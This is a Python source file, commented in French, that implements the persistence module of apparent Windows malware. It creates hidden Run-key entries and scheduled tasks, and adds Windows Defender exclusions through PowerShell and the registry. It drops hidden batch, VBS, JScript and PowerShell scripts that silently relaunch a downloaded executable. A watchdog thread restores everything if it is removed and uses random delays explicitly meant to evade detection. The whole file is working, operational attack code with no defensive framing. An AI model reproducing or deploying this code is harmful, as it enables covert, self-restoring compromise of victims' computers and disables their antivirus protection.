import os
import subprocess
import winreg
import threading
import time
import random

class PersistenceManager:
    """Gère les mécanismes de persistance sur le système."""
    
    def __init__(self, settings, encryptor):
        """Initialise le gestionnaire de persistance."""
        self.settings = settings
        self.encryptor = encryptor
        self.should_stop_monitoring = False  # Renommé pour éviter le conflit
        self.count = 0
        self._monitoring_thread = None
        
    def create_startup_entry(self, name, command):
        """Crée une entrée de démarrage dans le registre Windows."""
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"[-] Erreur lors de la création de l'entrée de démarrage: {e}")
            return False

    def create_scheduled_task(self, name, command, interval="MINUTE", value="5"):
        """Crée une tâche planifiée pour assurer la persistance."""
        try:
            cmd = [
                'schtasks', '/create', '/tn', name, '/tr', command,
                '/sc', interval, '/f'
            ]
            if value:  # Ajouter argument si nécessaire
                cmd.extend(['/mo', value])
            
            subprocess.run(cmd, check=False, capture_output=True)
            return True
        except Exception as e:
            print(f"[-] Erreur lors de la création de la tâche planifiée: {e}")
            return False

    def create_defender_exceptions(self):
        """Ajoute des exceptions à Windows Defender."""
        paths_to_exclude = [self.settings.temp_dir] + self.settings.backup_dirs
        
        for path in paths_to_exclude:
            try:
                # PowerShell pour ajouter l'exception
                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \'{path}\' -Force"'
                subprocess.run(cmd, shell=True, check=False, capture_output=True)
                
                # Méthode alternative via le registre
                reg_cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$p=\'{path}\'; New-ItemProperty -Path \'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\' -Name $p -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue"'
                subprocess.run(reg_cmd, shell=True, check=False, capture_output=True)
            except Exception as e:
                print(f"[-] Erreur lors de la création d'exception: {e}")

    def create_persistence_scripts(self):
        """Crée des scripts pour la persistance entre les redémarrages."""
        # Script batch pour redémarrage
        persistence_script = os.path.join(self.settings.temp_dir, self.settings.bat_filename)
        with open(persistence_script, 'w') as f:
            f.write('@echo off\n')
            f.write('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \'%~dp0\' -Force"\n')
            f.write(f'if exist "{os.path.join(self.settings.temp_dir, self.settings.download_filename)}" start "" /min "{os.path.join(self.settings.temp_dir, self.settings.download_filename)}"\n')
        
        # Script JavaScript pour contournement de sécurité 
        js_script = os.path.join(self.settings.temp_dir, self.settings.js_filename)
        js_content = f"""
        // Script JavaScript pour exécution silencieuse et contournement des restrictions
        try {{
            // Création de l'objet shell pour les opérations système
            var shell = new ActiveXObject("WScript.Shell");
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            
            // Chemins des dossiers critiques
            var tempDir = "{self.settings.temp_dir.replace('\\', '\\\\')}";
            var appdataDir = "{self.settings.appdata_dir.replace('\\', '\\\\')}";
            
            // Vérifier si les dossiers existent
            if (!fso.FolderExists(tempDir)) {{
                fso.CreateFolder(tempDir);
                shell.Run("cmd /c attrib +h +s \\"" + tempDir + "\\"", 0, true);
            }}
            
            if (!fso.FolderExists(appdataDir)) {{
                fso.CreateFolder(appdataDir);
                shell.Run("cmd /c attrib +h +s \\"" + appdataDir + "\\"", 0, true);
            }}
            
            // Exécuter le script PowerShell pour les opérations avancées
            var psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ";
            var psPath = "{os.path.join(self.settings.temp_dir, self.settings.ps_filename).replace('\\', '\\\\')}";
            
            if (fso.FileExists(psPath)) {{
                shell.Run(psCommand + "\\"" + psPath + "\\"", 0, false);
            }}
            
            // Vérifier et exécuter le fichier principal si nécessaire
            var exePath = "{os.path.join(self.settings.temp_dir, self.settings.download_filename).replace('\\', '\\\\')}";
            if (fso.FileExists(exePath)) {{
                // Vérifier si le processus est déjà en cours d'exécution
                try {{
                    var wmi = GetObject("winmgmts://./root/cimv2");
                    var procName = exePath.substring(exePath.lastIndexOf("\\\\") + 1);
                    var procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" + procName + "'");
                    var procRunning = false;
                    
                    for (var enumProc = new Enumerator(procs); !enumProc.atEnd(); enumProc.moveNext()) {{
                        procRunning = true;
                        break;
                    }}
                    
                    if (!procRunning) {{
                        shell.Run("\\"" + exePath + "\\"", 0, false);
                    }}
                }} catch (e) {{
                    // En cas d'erreur, essayer de lancer directement
                    shell.Run("\\"" + exePath + "\\"", 0, false);
                }}
            }}
        }} catch (e) {{
            // Silencieux en cas d'erreur
        }}
        """
        
        with open(js_script, 'w') as f:
            f.write(js_content)
        
        # Script PowerShell pour restauration et surveillance
        ps_script = os.path.join(self.settings.temp_dir, self.settings.ps_filename)
        ps_content = f"""
# Configuration pour exécution silencieuse
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$ProgressPreference = 'SilentlyContinue'

# Fonction pour ajouter des exceptions de manière discrète
function Add-SecureExclusion {{
    param($Path)
    try {{
        Add-MpPreference -ExclusionPath $Path -Force -ErrorAction SilentlyContinue
        
        # Méthode alternative via le registre
        $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
        if (!(Test-Path $regPath)) {{ New-Item -Path $regPath -Force | Out-Null }}
        New-ItemProperty -Path $regPath -Name $Path -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
    }} catch {{
        # Silencieux en cas d'erreur
    }}
}}

# Ajouter les exceptions
Add-SecureExclusion -Path "{self.settings.temp_dir}"
Add-SecureExclusion -Path "{self.settings.appdata_dir}"

# Créer les dossiers s'ils n'existent pas
$dirs = @("{self.settings.temp_dir}", "{self.settings.appdata_dir}")
foreach ($dir in $dirs) {{
    if (!(Test-Path $dir)) {{
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
        $attr = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        (Get-Item $dir -Force).Attributes = $attr
    }}
}}

# Vérifier et relancer le processus principal
$exePath = "{os.path.join(self.settings.temp_dir, self.settings.download_filename)}"
if (Test-Path $exePath) {{
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($exePath)
    $running = Get-Process -Name $processName -ErrorAction SilentlyContinue
    if (!$running) {{
        Start-Process -FilePath $exePath -WindowStyle Hidden
    }}
}}

# Copier dans le dossier de sauvegarde si nécessaire
$backupPath = "{os.path.join(self.settings.appdata_dir, self.settings.download_filename)}"
if ((Test-Path $exePath) -and !(Test-Path $backupPath)) {{
    Copy-Item -Path $exePath -Destination $backupPath -Force -ErrorAction SilentlyContinue
    (Get-Item $backupPath -Force).Attributes = [System.IO.FileAttributes]::Hidden
}}
"""
        
        with open(ps_script, 'w') as f:
            f.write(ps_content)
        
        # Script VBS pour exécution silencieuse
        vbs_script = os.path.join(self.settings.temp_dir, self.settings.vbs_filename)
        with open(vbs_script, 'w') as f:
            f.write('On Error Resume Next\n')
            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""{os.path.join(self.settings.temp_dir, self.settings.ps_filename)}""", 0, False\n')
            f.write(f'WshShell.Run "wscript.exe ""{os.path.join(self.settings.temp_dir, self.settings.js_filename)}""", 0, False\n')
        
        # Chiffrer les scripts pour protection supplémentaire
        self._encrypt_scripts([persistence_script, ps_script, vbs_script, js_script])
        
        # Masquer les fichiers
        for filepath in [persistence_script, vbs_script, ps_script, js_script]:
            subprocess.run(['attrib', '+h', '+s', filepath], check=False)
        
        return vbs_script
        
    def _encrypt_scripts(self, file_paths):
        """Chiffre les scripts sensibles avec clé de session."""
        # On ne chiffre pas les scripts d'auto-extraction
        return True

    def setup_infrastructure(self):
        """Configure l'infrastructure de persistance complète."""
        print("[+] Configuration de l'infrastructure persistante...")
        
        # Créer les dossiers principaux et de secours
        for directory in [self.settings.temp_dir] + self.settings.backup_dirs:
            if not os.path.exists(directory):
                try:
                    os.makedirs(directory)
                    # Masquer le dossier
                    subprocess.run(['attrib', '+h', '+s', directory], check=False)
                except Exception as e:
                    print(f"[-] Erreur lors de la création du dossier {directory}: {e}")
        
        # Ajouter exceptions Windows Defender
        self.create_defender_exceptions()
        
        # Créer les scripts de persistance
        vbs_script = self.create_persistence_scripts()
        
        # Ajouter aux clés de démarrage
        self.create_startup_entry(self.settings.service_name, f'wscript.exe "{vbs_script}"')
        
        # Créer des tâches planifiées
        self.create_scheduled_task(
            self.settings.service_name,
            f'wscript.exe "{vbs_script}"',
            "MINUTE",
            "15"
        )
        
        self.create_scheduled_task(
            f"{self.settings.service_name}_logon",
            f'wscript.exe "{vbs_script}"',
            "ONLOGON",
            ""
        )
        
        print("[+] Infrastructure de persistance déployée avec succès")

    def monitor_persistence(self, file_manager):
        """Surveille et restaure l'infrastructure de persistance."""
        print("[+] Démarrage de la surveillance...")
        
        while not self.should_stop_monitoring:
            try:
                # Vérifier les exceptions Defender
                verify_cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"'
                verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True)
                
                # Vérifier si au moins une exception est active
                exception_exists = any(directory.lower() in verify_result.stdout.lower() 
                                      for directory in [self.settings.temp_dir] + self.settings.backup_dirs)
                
                # Restaurer les exceptions si nécessaire
                if not exception_exists:
                    print("[!] Exceptions supprimées - Restauration en cours...")
                    self.create_defender_exceptions()
                
                # Vérifier si les dossiers existent toujours
                missing_dirs = [directory for directory in [self.settings.temp_dir] + self.settings.backup_dirs 
                               if not os.path.exists(directory)]
                
                if missing_dirs:
                    print(f"[!] Dossiers supprimés - Restauration de {len(missing_dirs)} dossier(s)...")
                    for directory in missing_dirs:
                        try:
                            os.makedirs(directory)
                            subprocess.run(['attrib', '+h', '+s', directory], check=False)
                        except Exception:
                            continue
                
                # Vérifier et restaurer les fichiers exécutables
                file_manager.check_and_restore_executables()
                
                # Vérifier les tâches planifiées et le registre
                self._check_and_restore_persistence_mechanisms()
                
                # État périodique
                if self.count % 10 == 0:
                    self.check_status()
                
                self.count += 1
                
            except Exception as e:
                print(f"[-] Erreur de surveillance: {e}")
            
            # Pause aléatoire pour éviter la détection par patterns
            time.sleep(random.uniform(3, 7))

    def _check_and_restore_persistence_mechanisms(self):
        """Vérifie et restaure les mécanismes de persistance (tâches, registre)."""
        # Vérifier les tâches planifiées
        task_exists = subprocess.run(
            ['schtasks', '/query', '/tn', self.settings.service_name, '/fo', 'list'],
            capture_output=True
        ).returncode == 0
        
        if not task_exists:
            print("[!] Tâche planifiée supprimée - Restauration...")
            vbs_script = os.path.join(self.settings.temp_dir, self.settings.vbs_filename)
            if os.path.exists(vbs_script):
                self.create_scheduled_task(self.settings.service_name, f'wscript.exe "{vbs_script}"', "MINUTE", "15")
        
        # Vérifier les entrées du registre
        reg_exists = subprocess.run([
            'reg', 'query', 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', self.settings.service_name
        ], capture_output=True).returncode == 0
        
        if not reg_exists:
            print("[!] Entrée de registre supprimée - Restauration...")
            vbs_script = os.path.join(self.settings.temp_dir, self.settings.vbs_filename)
            if os.path.exists(vbs_script):
                self.create_startup_entry(self.settings.service_name, f'wscript.exe "{vbs_script}"')

    def check_status(self):
        """Affiche l'état actuel des mécanismes de persistance."""
        try:
            # Vérification des exceptions
            verify_cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"'
            verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True)
            
            # Analyse de l'état actuel
            excluded_dirs = sum(1 for d in [self.settings.temp_dir] + self.settings.backup_dirs if d.lower() in verify_result.stdout.lower())
            existing_dirs = sum(1 for d in [self.settings.temp_dir] + self.settings.backup_dirs if os.path.exists(d))
            main_file_exists = os.path.exists(os.path.join(self.settings.temp_dir, self.settings.download_filename))
            backup_file_exists = os.path.exists(os.path.join(self.settings.appdata_dir, self.settings.download_filename))
            
            # Vérification des mécanismes de persistance
            task_exists = subprocess.run(
                ['schtasks', '/query', '/tn', self.settings.service_name, '/fo', 'list'],
                capture_output=True
            ).returncode == 0
            
            reg_exists = subprocess.run([
                'reg', 'query', 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', self.settings.service_name
            ], capture_output=True).returncode == 0
            
            # Affichage du statut
            print("\n--- État actuel ---")
            print(f"Exceptions actives: {excluded_dirs}/{len([self.settings.temp_dir] + self.settings.backup_dirs)}")
            print(f"Dossiers existants: {existing_dirs}/{len([self.settings.temp_dir] + self.settings.backup_dirs)}")
            print(f"Fichier principal: {'Oui (Chiffré)' if main_file_exists else 'Non'}")
            print(f"Fichier de sauvegarde: {'Oui (Chiffré)' if backup_file_exists else 'Non'}")
            print(f"Tâche planifiée active: {'Oui' if task_exists else 'Non'}")
            print(f"Entrée du registre: {'Oui' if reg_exists else 'Non'}")
            print("------------------\n")
        except Exception as e:
            print(f"[-] Erreur lors de la vérification du statut: {e}")
    
    def start_monitoring(self, file_manager):
        """Démarre la surveillance dans un thread séparé."""
        self._monitoring_thread = threading.Thread(target=self.monitor_persistence, args=(file_manager,))
        self._monitoring_thread.daemon = True
        self._monitoring_thread.start()
    
    def stop_monitoring(self):
        """Arrête le thread de surveillance."""
        self.should_stop_monitoring = True
        if self._monitoring_thread and self._monitoring_thread.is_alive():
            self._monitoring_thread.join(2)  # Attendre 2 secondes max
    
    def print_diagnostic_info(self):
        """Affiche les informations de diagnostic."""
        print("\n--- INFORMATIONS SUR LA PERSISTANCE ---")
        print(f"Dossier principal: {self.settings.temp_dir}")
        print(f"Dossier de sauvegarde: {self.settings.appdata_dir}")
        print(f"Script VBS: {os.path.join(self.settings.temp_dir, self.settings.vbs_filename)}")
        print(f"Script PowerShell: {os.path.join(self.settings.temp_dir, self.settings.ps_filename)}")
        print(f"Script JavaScript: {os.path.join(self.settings.temp_dir, self.settings.js_filename)}")
        if self.settings.download_url:
            print(f"Fichier principal: {os.path.join(self.settings.temp_dir, self.settings.download_filename)}")
        print(f"Tâche planifiée: {self.settings.service_name}")
        print(f"Clé de registre: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{self.settings.service_name}")
        print("----------------------------------------\n")